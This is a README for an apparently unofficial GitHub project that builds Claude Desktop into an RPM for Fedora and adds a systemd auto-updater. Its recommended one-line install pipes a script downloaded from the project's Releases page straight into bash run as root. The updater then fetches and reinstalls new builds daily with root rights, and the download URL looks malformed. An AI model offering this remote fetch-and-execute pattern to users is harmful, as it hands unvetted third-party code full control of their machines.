# Claude Desktop for Fedora — One-line Installer & RPM Build 🚀

[![Releases](https://img.shields.io/badge/Releases-Download-blue?logo=github)](https://github.com/kyoske0817/claude-desktop-fedora/releases)  
[![ai](https://img.shields.io/badge/topic-ai-lightgrey)](https://github.com/topics/ai) [![anthropic](https://img.shields.io/badge/topic-anthropic-lightgrey)](https://github.com/topics/anthropic) [![build-script](https://img.shields.io/badge/topic-build--script-lightgrey)](https://github.com/topics/build-script) [![claude](https://img.shields.io/badge/topic-claude-lightgrey)](https://github.com/topics/claude) [![desktop](https://img.shields.io/badge/topic-desktop-lightgrey)](https://github.com/topics/desktop) [![electron](https://img.shields.io/badge/topic-electron-lightgrey)](https://github.com/topics/electron) [![fedora](https://img.shields.io/badge/topic-fedora-lightgrey)](https://github.com/topics/fedora) [![installer](https://img.shields.io/badge/topic-installer-lightgrey)](https://github.com/topics/installer) [![linux](https://img.shields.io/badge/topic-linux-lightgrey)](https://github.com/topics/linux) [![rpm](https://img.shields.io/badge/topic-rpm-lightgrey)](https://github.com/topics/rpm)

![Claude Desktop](https://raw.githubusercontent.com/kyoske0817/claude-desktop-fedora/main/assets/claude-desktop-banner.png)

What this repository provides
- One-line installer for Claude Desktop on Fedora.
- Builds from the official Anthropic installer; no binary redistribution.
- Produces an RPM package and installs full desktop integration.
- Installs systemd auto-update service and desktop files.

Download and run the installer script from the Releases page:
https://github.com/kyoske0817/claude-desktop-fedora/releases

Quick view
- Platform: Fedora Linux (RPM-based)
- Packaging: RPM (dnf / rpm)
- GUI: Electron-based Claude Desktop
- Update: systemd timer + updater script
- Build: Local build from official installer assets

Key features
- One-line install that builds an RPM and registers the app with GNOME, KDE, and other desktops.
- No bundled Claude binary. The script downloads the official installer and builds locally.
- Desktop integration: .desktop file, icons, MIME handling, app shortcut.
- Auto-update using systemd timer that fetches new installer builds and triggers rpm rebuild.
- Uninstall script removes RPM, files, and systemd units.

Prerequisites
- Fedora 36 or newer.
- dnf or rpm available.
- curl or wget.
- sudo rights to install RPM and enable systemd services.
- tar, unzip, nodejs (if building Electron app), rpm-build (for custom builds).
- Recommended: 2 GB free disk space and 1 CPU core free during build.

Assets and releases
Download the installer asset from Releases. On the Releases page get the installer file (for example, claude-desktop-fedora-installer.sh). Download that file and execute it on your Fedora machine. Full Releases are at:
https://github.com/kyoske0817/claude-desktop-fedora/releases

Installer workflow (high level)
1. Download official Claude installer from Anthropic via the script.
2. Unpack the official installer into a build tree.
3. Wrap the app into an Electron shell if needed.
4. Create an RPM spec and build an RPM with rpmbuild.
5. Install RPM with dnf localinstall or rpm -Uvh.
6. Install .desktop, icons, and MIME files under /usr/share.
7. Install a systemd unit and timer to handle auto-updates.

One-line install (recommended)
Run the following from a terminal on Fedora:

sudo bash -c "$(curl -fsSL https://github.com/kyoske0817/claude-desktop-fedora/releases/download/latest/claude-desktop-fedora-installer.sh)"

If your environment lacks curl use wget:

sudo bash -c "$(wget -qO- https://github.com/kyoske0817/claude-desktop-fedora/releases/download/latest/claude-desktop-fedora-installer.sh)"

Replace the file name if releases include a different asset name. The script will validate your system, download the official installer, build an RPM, and install it.

Manual install (step-by-step)
1. Visit the Releases page and download the installer asset:
   https://github.com/kyoske0817/claude-desktop-fedora/releases
2. Make the script executable:
   chmod +x claude-desktop-fedora-installer.sh
3. Run the script with sudo:
   sudo ./claude-desktop-fedora-installer.sh
4. Follow prompts to accept license terms from the official installer and to confirm packaging options.

What the installer does
- Validates Fedora release and required tools.
- Downloads the official Anthropic installer package or electron bundle.
- Extracts app files to a build directory.
- Generates an RPM with a spec file that places files under /opt/claude-desktop.
- Installs an /usr/share/applications/claude-desktop.desktop file.
- Copies icons to /usr/share/icons/hicolor.
- Optionally enables and starts a systemd timer for automatic rebuild and reinstall.

Auto-update mechanism
- The installer creates a systemd service and timer named claude-desktop-updater.{service,timer}.
- The timer checks the Releases page on a configurable interval (default: daily) and downloads any new official installer assets.
- When a new asset arrives the service triggers the same build flow: download, build RPM, and install it.
- You can manage the timer with:
  sudo systemctl enable --now claude-desktop-updater.timer
  sudo systemctl status claude-desktop-updater.service

Files installed
- /opt/claude-desktop/ — app payload and resources
- /usr/share/applications/claude-desktop.desktop — Desktop entry
- /usr/share/icons/hicolor/*/apps/claude-desktop.png — app icons
- /usr/lib/systemd/system/claude-desktop-updater.service
- /etc/claude-desktop/config.yaml — optional config for updater

Uninstall
The installer provides an uninstall helper. To remove the app and cleanup systemd units:

sudo /opt/claude-desktop/uninstall.sh

If you prefer rpm tools:

sudo dnf remove claude-desktop

Troubleshooting
- Build fails with missing rpmbuild:
  Install rpm-build: sudo dnf install rpm-build
- Electron rebuild errors:
  Ensure nodejs and yarn/npm exist when the script needs to bundle shells.
- Desktop icon not visible:
  Run update-desktop-database or restart the shell.
- Updater does not trigger:
  Check timer status: sudo systemctl status claude-desktop-updater.timer

Security and privacy
- The installer downloads the official installer asset directly from Anthropic or the Releases page.
- The repository does not ship any Claude binary.
- The script validates checksums where available.
- Review the installer script before running it to confirm download sources and behaviors.

Packaging details (for maintainers)
- RPM spec follows Fedora packaging guidelines where possible without packaging for distribution.
- Build directory layout:
  /root/rpmbuild/BUILD/
  /root/rpmbuild/RPMS/x86_64/claude-desktop-<version>.rpm
- Spec includes pre/post install scripts to handle desktop registration.
- Systemd integration uses standard systemd unit paths and journals.

Development and build options
- Use BUILD_SKIP_UPDATER=1 to avoid installing the timer during development.
- Set BUILD_WITH_ELECTRON=0 to skip wrapping in Electron if upstream provides a ready app.
- Use BUILD_ARCH=x86_64 or BUILD_ARCH=aarch64 to control target arch for rpmbuild.

FAQ
Q: Does this redistribute Claude?
A: No. The installer downloads the official asset. This repo only packages the asset into an RPM.

Q: Can I inspect the installer first?
A: Yes. The script is plain bash. You can view it before running and it logs each major action.

Q: Does it support Flatpak or Snap?
A: This repo focuses on RPM packaging for Fedora. Flatpak and Snap are out of scope.

Q: How do I adjust the update frequency?
A: Edit /etc/claude-desktop/config.yaml and change the interval value, then restart the systemd timer.

Contributing
- Open issues for bugs or feature requests.
- For code changes, fork the repo and submit a pull request.
- Include tests where applicable and follow simple commit messages.
- Keep changes focused: packaging tweaks, spec improvements, and integration fixes welcome.

Testing guidelines
- Test on a clean Fedora VM.
- Use mock or mockbuild for isolated RPM builds.
- Run the full install flow and verify desktop entry and icons.
- Test updater by bumping a release tag in a private test repo and confirming the timer triggers a rebuild.

Changelog
- See the Releases page for packaged builds and release notes:
  https://github.com/kyoske0817/claude-desktop-fedora/releases

Credits and resources
- Anthropic — official Claude installer and assets.
- Electron — runtime shell for the desktop app.
- Fedora packaging community — packaging practices and guidelines.

Images and assets used
- Electron logo and Fedora logos come from their official sites and are used to illustrate integration.
- App icons are installed by the script from the official app assets.

License
- This repository uses the MIT License. See LICENSE for details.

Contact
- Open issues on GitHub for support or questions.
- Submit PRs to the main branch for packaging fixes and improvements.

Screenshots
![Claude Desktop Screenshot](https://raw.githubusercontent.com/kyoske0817/claude-desktop-fedora/main/assets/screenshot-1.png)
![Claude Desktop Tray](https://raw.githubusercontent.com/kyoske0817/claude-desktop-fedora/main/assets/screenshot-2.png)